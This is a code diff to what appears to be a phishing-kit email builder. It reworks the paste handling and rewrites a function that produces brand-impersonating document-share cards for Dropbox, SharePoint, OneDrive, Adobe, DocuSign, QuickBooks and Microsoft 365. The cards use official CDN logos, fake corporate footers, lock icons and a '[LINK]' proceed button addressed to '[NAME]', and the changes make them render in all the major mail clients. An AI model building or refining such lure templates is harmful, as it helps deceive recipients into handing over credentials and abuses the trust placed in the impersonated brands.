@@ -486,12 +486,10 @@ HTML_TEMPLATE = r'''
         .b2b-merge-btn:hover { background:#e50914; border-color:#ff3b45; color:#ffffff; box-shadow:0 0 10px rgba(229,9,20,0.5); transform:translateY(-1px); }
         
         .b2b-editor-area { border:1px solid #38161b; border-radius:0 0 6px 6px; background:#ffffff; flex:1; height:100%; min-height:0; display:flex; flex-direction:column; overflow:hidden; }
-        .b2b-editor-content { flex:1; height:100%; overflow-y:auto; padding:18px 24px; outline:none; font-size:14px; color:#1a1a1a; line-height:1.6; box-sizing:border-box; }
-        .b2b-editor-content * { max-width:100% !important; box-sizing:border-box !important; }
-        .b2b-editor-content img { max-width:100% !important; height:auto !important; }
-        .b2b-editor-content table { max-width:100% !important; width:100% !important; }
-        .b2b-editor-content .b2b-card-outer, .b2b-editor-content .b2b-email-card { max-width:350px !important; width:350px !important; margin:12px auto !important; }
-        .b2b-editor-content:empty::before { content:attr(placeholder); color:#9ca3af; }
+        .b2b-editor-content { flex:1; height:100%; overflow-y:auto; padding:18px 24px; outline:none; font-size:14px; color:#1a1a1a; line-height:1.6; }
+        .b2b-editor-content img { max-width:100%; height:auto; }
+        .b2b-editor-content table { max-width:100%; }
+        .b2b-editor-content .b2b-card-outer { max-width:420px; width:100%; margin:12px auto; }
         .b2b-editor-content:empty::before { content:attr(placeholder); color:#9ca3af; }
         
         .b2b-preview-wrap { width:100%; height:100%; flex:1; background:#f1f5f9; display:flex; justify-content:center; align-items:flex-start; overflow-y:auto; padding:14px; box-sizing:border-box; }
@@ -11453,27 +11451,58 @@ Delegated     : ${inboxesDesc}
             }
         }
 
-        // Intercept pastes into the visual editor — if it looks like HTML, render it
+        // Intercept pastes into the visual editor — clean up webmail/HTML paste artifacts and preserve table structures
         document.getElementById('b2b-editor') && document.getElementById('b2b-editor').addEventListener('paste', function(e) {
             const html  = e.clipboardData.getData('text/html');
             const plain = e.clipboardData.getData('text/plain').trim();
-            if (html) {
-                setTimeout(updateB2BLivePreview, 50);
-                return;
-            }
+            const srcTa = document.getElementById('b2b-source-ta');
+
+            // 1. If raw HTML code was pasted (e.g. from an editor or email source)
             if (plain.startsWith('<') && (plain.includes('</') || plain.includes('/>'))) {
                 e.preventDefault();
-                this.innerHTML = plain;
-                const range = document.createRange();
-                range.selectNodeContents(this);
-                range.collapse(false);
-                const sel = window.getSelection();
-                sel.removeAllRanges();
-                sel.addRange(range);
+                if (!this.innerText.trim() || plain.includes('<html') || plain.includes('<body') || plain.includes('<table')) {
+                    this.innerHTML = plain;
+                } else {
+                    document.execCommand('insertHTML', false, plain);
+                }
+                if (srcTa) srcTa.value = this.innerHTML;
                 updateB2BLivePreview();
-            } else {
-                setTimeout(updateB2BLivePreview, 50);
+                return;
             }
+
+            // 2. If rich HTML copied from Gmail or webmail
+            if (html) {
+                // Strip Gmail wrapper comments and internal class markers
+                let cleanedHtml = html
+                    .replace(/<!--StartFragment-->/gi, '')
+                    .replace(/<!--EndFragment-->/gi, '')
+                    .replace(/class="gmail_[^"]*"/gi, '')
+                    .replace(/class="m_[-_0-9a-zA-Z]+"/gi, '')
+                    .replace(/data-smartmail="[^"]*"/gi, '');
+
+                if (cleanedHtml.includes('<table') || cleanedHtml.includes('<div')) {
+                    e.preventDefault();
+                    if (!this.innerText.trim()) {
+                        this.innerHTML = cleanedHtml;
+                    } else {
+                        document.execCommand('insertHTML', false, cleanedHtml);
+                    }
+                    if (srcTa) srcTa.value = this.innerHTML;
+                    setTimeout(updateB2BLivePreview, 40);
+                    return;
+                }
+                setTimeout(() => {
+                    if (srcTa) srcTa.value = this.innerHTML;
+                    updateB2BLivePreview();
+                }, 50);
+                return;
+            }
+
+            // 3. Plain text
+            setTimeout(() => {
+                if (srcTa) srcTa.value = this.innerHTML;
+                updateB2BLivePreview();
+            }, 50);
         });
 
         // Attach live input listeners for real-time preview sync
@@ -16015,12 +16044,32 @@ def _b2b_suggested_subjects(brand, dep_name=''):
         )
 
 
+def _get_b2b_email_logo(brand, max_h=30):
+    """Return a lightweight, email-safe brand logo header using official CDN assets instead of heavy base64 blobs."""
+    b = (brand or '').lower()
+    logos = {
+        'dropbox': ('https://cfl.dropboxstatic.com/static/images/brand/dropbox-logo_vector_stroke.svg', 'Dropbox', 26),
+        'sharepoint': ('https://res.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/brand-icons/product/svg/sharepoint_32x1.svg', 'SharePoint', 28),
+        'onedrive': ('https://res.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/brand-icons/product/svg/onedrive_32x1.svg', 'OneDrive', 28),
+        'adobe': ('https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_HEX.svg', 'Adobe Acrobat', 26),
+        'docusign': ('https://docucdn-a.akamaihd.net/corporate/3.54.0/img/logo.svg', 'DocuSign', 24),
+        'quickbooks': ('https://quickbooks.intuit.com/cas/dam/INVENTORY/QuickBooks-Logo.svg', 'QuickBooks', 24),
+        'microsoft': ('https://res.cdn.office.net/files/fabric-cdn-prod_20240129.001/assets/brand-icons/product/svg/msft_32x1.svg', 'Microsoft 365', 26),
+    }
+    for k, (url, alt, h) in logos.items():
+        if k in b:
+            return f'<table role="presentation" border="0" cellpadding="0" cellspacing="0" align="center" style="margin:0 auto 12px;"><tr><td align="center" valign="middle"><img src="{url}" alt="{alt}" height="{h}" border="0" style="height:{h}px;max-height:{h}px;border:0;outline:none;text-decoration:none;display:block;margin:0 auto;" /></td></tr></table>'
+
+    # Fallback to Microsoft 365
+    url, alt, h = logos['microsoft']
+    return f'<table role="presentation" border="0" cellpadding="0" cellspacing="0" align="center" style="margin:0 auto 12px;"><tr><td align="center" valign="middle"><img src="{url}" alt="{alt}" height="{h}" border="0" style="height:{h}px;max-height:{h}px;border:0;outline:none;text-decoration:none;display:block;margin:0 auto;" /></td></tr></table>'
+
+
 def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
-    """Return a clean, authentic email card that fits neatly inside the editor box without wallpaper/blur backgrounds."""
-    import assets
+    """Return an email-client compliant, table-based email card that renders identically in Gmail, Outlook, Yahoo, and mobile."""
     cfg = cfg or {}
     b = (brand or '').lower()
-    
+
     if 'dropbox' in b:
         accent = '#0061FF'
         badge = cfg.get('doc_badge', 'PDF')
@@ -16033,7 +16082,7 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Dropbox, Inc. · Secure Cloud Storage')
         border = '#e2e8f0'
         btn_radius = '6px'
-        logo = assets.get_logo_html('Dropbox', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('dropbox')
     elif 'sharepoint' in b:
         accent = '#038387'
         badge = cfg.get('doc_badge', 'PDF')
@@ -16046,7 +16095,7 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Microsoft Corporation · Secure Transmission')
         border = '#e2e8f0'
         btn_radius = '4px'
-        logo = assets.get_logo_html('SharePoint', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('sharepoint')
     elif 'onedrive' in b:
         accent = '#0078D4'
         badge = cfg.get('doc_badge', 'DOCX')
@@ -16059,7 +16108,7 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Microsoft Corporation · One Microsoft Way, Redmond, WA')
         border = '#e2e8f0'
         btn_radius = '4px'
-        logo = assets.get_logo_html('OneDrive', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('onedrive')
     elif 'adobe' in b:
         accent = '#FA0F00'
         badge = cfg.get('doc_badge', 'PDF')
@@ -16072,7 +16121,7 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Adobe Systems Software Ireland Limited')
         border = '#e5e7eb'
         btn_radius = '20px'
-        logo = assets.get_logo_html('Adobe', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('adobe')
     elif 'docusign' in b:
         accent = '#FFCE00'
         badge = cfg.get('doc_badge', 'DOC')
@@ -16085,7 +16134,7 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'DocuSign, Inc. · Electronic Record and Signature Disclosure')
         border = '#e5e7eb'
         btn_radius = '4px'
-        logo = assets.get_logo_html('DocuSign', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('docusign')
     elif 'quickbooks' in b:
         accent = '#2CB34A'
         badge = cfg.get('doc_badge', 'INV')
@@ -16098,7 +16147,7 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Intuit Inc. · All rights reserved')
         border = '#e5e7eb'
         btn_radius = '4px'
-        logo = assets.get_logo_html('QuickBooks', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('quickbooks')
     else:
         accent = '#0078D4'
         badge = cfg.get('doc_badge', 'FILE')
@@ -16111,33 +16160,71 @@ def build_b2b_email_card(brand, cfg=None, proceed_url='[LINK]'):
         foot2 = cfg.get('footer_text', 'Secure Communications System')
         border = '#e2e8f0'
         btn_radius = '6px'
-        logo = assets.get_logo_html('Microsoft 365', max_height=32, max_width=120, extra_style='margin:0 auto 10px;display:block;')
+        logo = _get_b2b_email_logo('microsoft')
 
     badge_text = '#111111' if accent == '#FFCE00' else '#ffffff'
     btn_text = '#111111' if accent == '#FFCE00' else '#ffffff'
 
-    return f'''<div class="b2b-card-outer" style="max-width:350px;width:350px;margin:12px auto;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
-  <p style="margin:0 0 10px;font-size:13.5px;color:#1e293b;line-height:1.4;">Hello [NAME],</p>
-  <div class="b2b-email-card" style="width:100%;max-width:350px;background:#ffffff;border:1px solid {border};border-radius:12px;box-shadow:0 4px 22px rgba(0,0,0,0.08);padding:22px 18px 16px;text-align:center;box-sizing:border-box;">
-    {logo}
-    <h2 style="font-size:16.5px;font-weight:700;color:#0f172a;margin:10px 0 5px;line-height:1.3;letter-spacing:-0.2px;">{title}</h2>
-    <p style="font-size:12.5px;color:#64748b;margin:0 0 14px;line-height:1.45;">{desc}</p>
-    <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;padding:9px 12px;display:flex;align-items:center;gap:10px;margin:0 0 15px;text-align:left;box-sizing:border-box;">
-      <span style="background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:2px 6px;border-radius:4px;flex-shrink:0;letter-spacing:0.4px;">{badge}</span>
-      <div style="overflow:hidden;flex:1;">
-        <div style="font-size:12.5px;font-weight:600;color:#1e293b;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">{doc_name}</div>
-        <div style="font-size:10.5px;color:#94a3b8;margin-top:1px;">{doc_sub}</div>
-      </div>
-    </div>
-    <div style="margin:14px 0 10px;">
-      <a href="{proceed_url}" target="_blank" style="display:flex;align-items:center;justify-content:center;gap:6px;width:100%;box-sizing:border-box;background-color:{accent};color:{btn_text} !important;text-decoration:none;font-weight:600;font-size:13.5px;padding:10px 18px;border-radius:{btn_radius};box-shadow:0 2px 8px rgba(0,0,0,0.12);transition:opacity 0.15s;">🔒 {btn_label}</a>
-    </div>
-    <div style="border-top:1px solid #f1f5f9;margin-top:14px;padding-top:10px;">
-      <div style="font-size:11px;color:#94a3b8;margin-bottom:2px;">{foot1}</div>
-      <div style="font-size:10.5px;color:#cbd5e1;">🔒 {foot2}</div>
-    </div>
-  </div>
-  <p style="margin:10px 0 0;font-size:12px;color:#64748b;line-height:1.4;"><br></p>
+    # 100% Email Client Compliant HTML (Gmail, Outlook Desktop & Web, Apple Mail, Yahoo)
+    return f'''<div class="b2b-card-outer" style="max-width:380px;width:100%;margin:12px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1e293b;">
+  <p style="margin:0 0 12px;font-size:14px;color:#1e293b;line-height:1.5;">Hello [NAME],</p>
+
+  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width:380px;background:#ffffff;border:1px solid {border};border-radius:12px;border-collapse:separate;box-shadow:0 4px 18px rgba(0,0,0,0.06);margin:0 auto;text-align:center;">
+    <tr>
+      <td style="padding:22px 20px 18px;text-align:center;">
+
+        <!-- Brand Logo Header -->
+        {logo}
+
+        <!-- Title & Subtitle -->
+        <h2 style="font-size:17px;font-weight:700;color:#0f172a;margin:0 0 6px;line-height:1.3;letter-spacing:-0.2px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{title}</h2>
+        <p style="font-size:13px;color:#64748b;margin:0 0 16px;line-height:1.45;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{desc}</p>
+
+        <!-- Document Badge Row (Table-based: Cross-client reliable) -->
+        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:7px;margin:0 0 16px;border-collapse:separate;table-layout:fixed;">
+          <tr>
+            <td width="48" valign="middle" align="center" style="padding:10px 0 10px 12px;width:48px;">
+              <span style="display:inline-block;background:{accent};color:{badge_text};font-size:10.5px;font-weight:700;padding:3px 6px;border-radius:4px;letter-spacing:0.4px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{badge}</span>
+            </td>
+            <td valign="middle" align="left" style="padding:10px 12px 10px 10px;">
+              <div style="font-size:13px;font-weight:600;color:#1e293b;line-height:1.3;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{doc_name}</div>
+              <div style="font-size:11px;color:#94a3b8;margin-top:2px;line-height:1.2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{doc_sub}</div>
+            </td>
+          </tr>
+        </table>
+
+        <!-- CTA Button (Bulletproof Table-Based Email Button) -->
+        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tr>
+            <td align="center" style="padding:4px 0 12px;">
+              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
+                <tr>
+                  <td align="center" bgcolor="{accent}" style="border-radius:{btn_radius};background-color:{accent};">
+                    <a href="{proceed_url}" target="_blank" style="display:block;width:100%;padding:11px 18px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:13.5px;font-weight:600;color:{btn_text} !important;text-decoration:none;border-radius:{btn_radius};box-sizing:border-box;text-align:center;">
+                      &#128274; {btn_label}
+                    </a>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+
+        <!-- Footer Notice -->
+        <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-top:1px solid #f1f5f9;margin-top:12px;">
+          <tr>
+            <td align="center" style="padding-top:10px;">
+              <div style="font-size:11px;color:#94a3b8;margin-bottom:3px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">{foot1}</div>
+              <div style="font-size:10.5px;color:#cbd5e1;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">&#128274; {foot2}</div>
+            </td>
+          </tr>
+        </table>
+
+      </td>
+    </tr>
+  </table>
+
+  <p style="margin:12px 0 0;font-size:12px;color:#64748b;line-height:1.4;"><br></p>
 </div>'''
 
 
